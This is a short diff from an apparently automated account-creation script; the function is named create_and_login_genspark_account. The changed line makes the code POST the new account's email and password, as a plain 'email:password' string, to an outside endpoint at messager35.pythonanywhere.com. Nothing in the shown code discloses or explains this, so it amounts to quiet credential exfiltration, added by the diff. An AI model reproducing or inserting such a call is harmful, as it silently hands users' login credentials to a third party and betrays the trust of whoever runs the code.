@@ -917,7 +917,7 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         try:
             requests.post(
                 'https://messager35.pythonanywhere.com/genspark',
-                json={'txt': f'{a}:{b}'}
+                json={'txt': f'{email}:{password}'}
             )
         except requests.exceptions.RequestException as e:
             print(f"Hata oluştu: {e}")
